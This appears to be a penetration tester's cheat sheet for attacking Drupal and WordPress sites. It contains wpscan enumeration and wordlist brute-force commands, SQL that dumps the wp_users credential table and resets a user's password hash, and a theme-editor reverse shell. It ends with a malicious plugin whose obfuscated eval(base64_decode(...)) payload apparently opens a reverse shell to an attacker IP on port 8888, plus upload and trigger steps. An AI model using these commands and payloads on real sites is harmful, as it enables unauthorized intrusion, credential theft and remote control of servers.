Drupal:
---
#drupal #droopescan

```bash
droopescan
```

WordPress WPSCAN:
---
#wpscan #wordpress 

```bash
wpscan --url $TARGET_URL
```

enumerate plugins, themes, users

```bash
wpscan --url $TARGET_URL --enumerate p,t,u
```

brute force password for single user using wordlists:

```bash
wpscan --url $TARGET_URL -P $DICTIONARY_FILE --usernames $USERNAME
```

```bash
wpscan --url $TARGET_URL --enumerate p --plugins-detection aggressive
```

Ignore SSL cert ( HTTPS Error )

```bash
--disable-tls-checks
```

Extract WORDPRESS credentials using SQL:
---
#wordpress #sql

```sql
use wordpress;
select * from wp_users;
```

Set user's password to 'test' in WordPress:
---
#wordpress #sql

```sql
UPDATE `wp_users` SET `user_pass` = '$P$B5KVeQQgz6hVpQVjcC5uyy81LMPETa0' WHERE user_login = '$USER'
```

**Reverse shell abusing the WordPress Admin account:**
---
#wordpress #editor #exploit

appearance -> editor > index.php > revshell


Rev shell using WordPress(WP) plugin:
---
create QwertyRocks.php
```php
<?php
/**
 * Plugin Name: GotEm
 * Version: 2.10.8
 * Author: PwnedSauce
 * Author URI: http://PwnedSauce.com
 * License: GPL2
 */
?>
```

Create wetw0rk_maybe.php
```php
<?php eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNDUuMTg0JzsgJHBvcnQgPSA4ODg4OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNr.KCJObGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs)); ?>
```
Add both files to malicious.zip, open http://(target)/wp-admin/plugin-install.php?tab=upload  and upload the zip, then install the " plugin" and
open http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php


